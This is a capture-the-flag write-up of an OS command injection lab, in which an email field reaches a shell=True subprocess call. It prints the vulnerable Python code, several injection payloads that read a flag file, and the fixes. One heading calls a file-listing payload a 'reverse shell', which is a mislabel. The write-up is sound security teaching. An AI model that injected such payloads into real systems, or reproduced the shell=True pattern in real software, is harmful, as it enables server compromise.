# Challenge 05 — Statement Mailer (Command Injection)

## Hook

An email address that can run commands is not an email address — it's a backdoor. In this challenge, the delivery email field is passed directly to a shell command, opening the server to arbitrary command execution.

---

## Challenge Overview

### Description

Users request account statements by providing an account ID and delivery email. The server constructs and dispatches the statement using a system command.

### Goal

Execute arbitrary commands on the server to read `/app/data/flag_cmdi.txt` and retrieve the flag.

### Hint Analysis

> "The email field is only the beginning of the journey."

The hint suggests the email input goes through more processing than expected — specifically, it's passed to a shell command.

---

## Vulnerability Identification

- **Vulnerability Class:** OS Command Injection
- **Why It Exists:** The `email` parameter is interpolated directly into a `subprocess.run()` call with `shell=True`.
- **Typical Real-World Impact:** Full server compromise, data exfiltration, lateral movement.

The vulnerable code in `main.py`:

```python
result = subprocess.run(
    f'sendmail {email}',
    shell=True, capture_output=True, text=True, timeout=10
)
```

The `sendmail` command is a placeholder — the vulnerability is that any shell metacharacters in `email` will be interpreted.

---

## Recon and Testing

### Request Analysis

`POST /tools/statement` with `account_id=ACC-1042` and `email=<value>`.

### Response Analysis

The server returns the output (stdout/stderr) of the shell command in a "Delivery Log" terminal box.

### Behavioral Differences

- `email=test@test.com` → "Delivery attempted."
- `email=test@test.com;id` → shows the `id` command output (e.g., `uid=1000...`)
- `email=;cat /app/data/flag_cmdi.txt` → shows the flag content.

---

## Exploitation

### Step-by-Step

1. Inject a shell command after a command separator (`;`, `|`, `&&`, `` ` ``, or `$(...)`).
2. Use `cat /app/data/flag_cmdi.txt` as the injected command.
3. Submit the form and read the flag from the delivery log output.

### Payloads

**Via semicolon (command chaining):**

```
; cat /app/data/flag_cmdi.txt ;
```

**Via backtick (command substitution):**

```
`cat /app/data/flag_cmdi.txt`
```

**Via sub-shell:**

```
$(cat /app/data/flag_cmdi.txt)
```

**For reverse shell or interactive exploration:**

```
; ls /app/data/ ; cat /app/data/flag_cmdi.txt ;
```

### Why It Works

- `shell=True` passes the command string to `/bin/sh -c`, which interprets shell metacharacters.
- The `sendmail <email>` command becomes `sendmail ; cat /app/data/flag_cmdi.txt ;` — the semicolon terminates the original command and executes the injected one.
- The stdout of the entire command (including the injected command's output) is returned to the user.

### Expected Result

The delivery log displays the contents of `/app/data/flag_cmdi.txt`:

```
FLAG{cmdi_<8-char-hex>}
```

---

## Flag Retrieval

1. Go to `/tools/statement`.
2. In the "Delivery Email" field, enter: `; cat /app/data/flag_cmdi.txt ;`
3. Click "Send Statement".
4. The flag appears in the "Delivery Log" section.

---

## Root Cause

The developer trusted that the email field would only contain an email address and passed it directly to a shell command without validation or sanitization. Using `shell=True` with string interpolation is the fundamental mistake.

---

## Remediation

- **Never use `shell=True` with user input.** Use `subprocess.run()` with a list of arguments instead:

  ```python
  subprocess.run(['sendmail', email], capture_output=True, text=True, timeout=10)
  ```

- **Validate email input** against a strict regex before any processing.
- **Use a dedicated email library** (e.g., `smtplib`) instead of shell commands.
- **Apply the principle of least privilege** to the application process.

---

## Key Takeaways

- **Vulnerability:** OS Command Injection via unsanitized `shell=True` subprocess call.
- **Exploitation Path:** Inject shell metacharacters (`;`, backtick, `$()`) to execute arbitrary commands.
- **Security Lesson:** Never pass user input to a shell. Use argument lists instead of strings, and avoid `shell=True` whenever possible.
